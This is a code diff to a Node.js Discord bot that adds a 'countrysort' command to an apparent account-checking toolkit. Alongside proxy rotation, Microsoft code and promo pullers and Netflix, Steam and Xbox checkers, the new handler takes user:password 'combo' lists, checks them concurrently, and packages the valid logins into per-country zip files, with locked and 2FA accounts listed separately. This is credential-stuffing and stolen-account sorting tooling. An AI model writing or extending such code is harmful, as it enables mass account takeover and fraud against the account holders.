@@ -15,6 +15,7 @@ const { pullCodes } = require("./utils/microsoft-puller");
 const { pullPromos } = require("./utils/promo-puller");
 const { checkRefundAccounts } = require("./utils/microsoft-refund");
 const { checkInboxAccounts, getServiceCount } = require("./utils/microsoft-inbox");
+const { runCountrySort } = require("./utils/microsoft-countrysort");
 const { loadProxies, isProxyEnabled, getProxyCount, getProxyStats } = require("./utils/proxy-manager");
 const blacklist = require("./utils/blacklist");
 const { setWlids, getWlids, getWlidCount } = require("./utils/wlid-store");
@@ -34,6 +35,8 @@ const {
   promoPullerResultsEmbed,
   inboxAioProgressEmbed,
   inboxAioResultsEmbed,
+  countrySortProgressEmbed,
+  countrySortResultsEmbed,
   rewardsResultsEmbed,
   refundProgressEmbed,
   refundResultsEmbed,
@@ -89,7 +92,7 @@ function isOwner(userId) {
 // ── Channel enforcement ──────────────────────────────────────
 
 const PULLER_CHECKER_CMDS = new Set(["pull", "promopuller", "check", "checker", "claim"]);
-const INBOX_NORMAL_CMDS = new Set(["inboxaio", "rewards", "help", "stats", "wlidset", "refund", "netflix", "steam", "xboxchk", "aio"]);
+const INBOX_NORMAL_CMDS = new Set(["inboxaio", "countrysort", "rewards", "help", "stats", "wlidset", "refund", "netflix", "steam", "xboxchk", "aio"]);
 
 function getRequiredChannel(cmd) {
   if (PULLER_CHECKER_CMDS.has(cmd)) return config.ALLOWED_CHANNEL_PULLER;
@@ -844,6 +847,122 @@ async function handleInboxAio(respond, userId, accountsRaw, accountsFile, thread
   }
 }
 
+// ── Country Sort ─────────────────────────────────────────────
+
+async function handleCountrySort(respond, userId, accountsRaw, accountsFile, threads = 3, dmUser = null) {
+  if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });
+
+  const acquire = limiter.acquire(userId, "countrysort");
+  if (!acquire.ok) return respond({ embeds: [errorEmbed(acquire.reason === "busy" ? "You already have a command running." : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached.`)] });
+
+  const ac = new AbortController();
+  activeAborts.set(userId, ac);
+
+  try {
+    const accounts = await gatherCombos(accountsRaw, accountsFile);
+    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided.")] });
+
+    const startTime = Date.now();
+
+    const msg = await respond({
+      embeds: [countrySortProgressEmbed({ completed: 0, total: accounts.length, hits: 0, fails: 0, elapsed: 0, countryBreakdown: {}, username: dmUser?.username })],
+      components: [stopButton(userId)],
+      fetchReply: true,
+    });
+
+    let lastUpdate = Date.now();
+    let totalHits = 0, totalFails = 0;
+
+    const { results, countryBreakdown } = await runCountrySort(
+      accounts,
+      threads,
+      (done, total, status, hits, fails, lastResult, liveCountries) => {
+        totalHits = hits || 0;
+        totalFails = fails || 0;
+        const now = Date.now();
+        if (now - lastUpdate > 2500) {
+          lastUpdate = now;
+          updateProgress(msg, countrySortProgressEmbed({
+            completed: done, total, hits: totalHits, fails: totalFails,
+            elapsed: Date.now() - startTime,
+            latestAccount: lastResult?.user || "", latestStatus: status || "",
+            countryBreakdown: { ...(liveCountries || {}) },
+            username: dmUser?.username,
+          }), userId);
+        }
+      },
+      ac.signal
+    );
+
+    const stopped = ac.signal.aborted;
+    const elapsed = Date.now() - startTime;
+
+    const hitResults = results.filter((r) => r.status === "hit");
+    const failResults = results.filter((r) => r.status === "fail");
+    const lockedResults = results.filter((r) => r.status === "locked" || r.status === "custom");
+    const twoFAResults = results.filter((r) => r.status === "2fa");
+
+    // Build per-country files (sorted, top 20 emphasized in UI)
+    const sortedCountries = Object.entries(countryBreakdown).sort((a, b) => b[1] - a[1]);
+
+    const zipEntries = [];
+    const perCountry = {};
+    for (const r of hitResults) {
+      const c = (r.country || "UNKNOWN").toString().trim().toUpperCase() || "UNKNOWN";
+      if (!perCountry[c]) perCountry[c] = [];
+      let line = `${r.user}:${r.password}`;
+      if (r.name) line += ` | ${r.name}`;
+      if (r.country) line += ` | ${r.country}`;
+      perCountry[c].push(line);
+    }
+    for (const [code, lines] of Object.entries(perCountry)) {
+      if (lines.length === 0) continue;
+      const safe = code.replace(/[^a-zA-Z0-9]/g, "_") || "UNKNOWN";
+      zipEntries.push({ name: `country_${safe}.txt`, content: lines.join("\n") });
+    }
+
+    if (sortedCountries.length > 0) {
+      const summary = sortedCountries.map(([c, n], i) => `${String(i + 1).padStart(2)}. ${c.padEnd(8)} : ${n}`).join("\n");
+      zipEntries.push({ name: "top_countries.txt", content: summary });
+    }
+    if (hitResults.length > 0) {
+      zipEntries.push({ name: "all_hits.txt", content: hitResults.map((r) => `${r.user}:${r.password} | ${r.country || "UNKNOWN"}`).join("\n") });
+    }
+    if (failResults.length > 0) zipEntries.push({ name: "failed.txt", content: failResults.map((r) => `${r.user}:${r.password} | ${r.detail || "failed"}`).join("\n") });
+    if (lockedResults.length > 0) zipEntries.push({ name: "locked.txt", content: lockedResults.map((r) => `${r.user}:${r.password}`).join("\n") });
+    if (twoFAResults.length > 0) zipEntries.push({ name: "2fa.txt", content: twoFAResults.map((r) => `${r.user}:${r.password}`).join("\n") });
+
+    const embed = countrySortResultsEmbed({
+      total: results.length, hits: hitResults.length, fails: failResults.length,
+      locked: lockedResults.length, twoFA: twoFAResults.length,
+      elapsed, countryBreakdown, username: dmUser?.username,
+    });
+    if (stopped) embed.setDescription((embed.data.description || "") + "\n\n*Stopped -- partial results*");
+
+    const { buildZipBuffer } = require("./utils/zip-builder");
+    const zipBuffer = buildZipBuffer(zipEntries);
+    const zipFile = new AttachmentBuilder(zipBuffer, { name: "countrysort_results.zip" });
+
+    if (dmUser) {
+      try {
+        await dmUser.send({ embeds: [embed], files: [zipFile] });
+        await msg.edit({ embeds: [infoEmbed("Country Sort Complete", `Sorted ${hitResults.length} hits across ${Object.keys(countryBreakdown).length} countries. Results sent to your DMs.`)], components: [] });
+      } catch {
+        await msg.edit({ embeds: [embed], files: [zipFile], components: [] });
+      }
+    } else {
+      await msg.edit({ embeds: [embed], files: [zipFile], components: [] });
+    }
+
+    statsManager.record(userId, "countrysort", hitResults.length);
+  } catch (err) {
+    await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
+  } finally {
+    activeAborts.delete(userId);
+    limiter.release(userId);
+  }
+}
+
 // ── Admin Panel ─────────────────────────────────────────────
 
 async function handleAdminPanel(respond, callerId) {
@@ -1082,6 +1201,13 @@ client.on("interactionCreate", async (interaction) => {
         interaction.options.getAttachment("accounts_file"),
         interaction.options.getInteger("threads") || 3,
         user);
+    } else if (commandName === "countrysort") {
+      await interaction.deferReply();
+      await handleCountrySort(respond, user.id,
+        interaction.options.getString("accounts"),
+        interaction.options.getAttachment("accounts_file"),
+        interaction.options.getInteger("threads") || 3,
+        user);
     } else if (commandName === "wlidset") {
       await handleWlidSet(respond, user.id,
         interaction.options.getString("wlids"),
@@ -1261,6 +1387,11 @@ client.on("messageCreate", async (message) => {
       const attachment = message.attachments.first();
       if (!accountsRaw && !attachment) return respond({ embeds: [infoEmbed("Usage", `\`.inboxaio <accounts>\` or attach .txt — scans ${getServiceCount()}+ services.`)] });
       await handleInboxAio(respond, message.author.id, accountsRaw, attachment, 3, message.author);
+    } else if (cmd === "countrysort") {
+      const accountsRaw = args.join(" ");
+      const attachment = message.attachments.first();
+      if (!accountsRaw && !attachment) return respond({ embeds: [infoEmbed("Usage", "`.countrysort <accounts>` or attach .txt — sorts by country, top 20 shown.")] });
+      await handleCountrySort(respond, message.author.id, accountsRaw, attachment, 3, message.author);
     } else if (cmd === "wlidset") {
       const wlidsRaw = args.join(" ");
       const attachment = message.attachments.first();
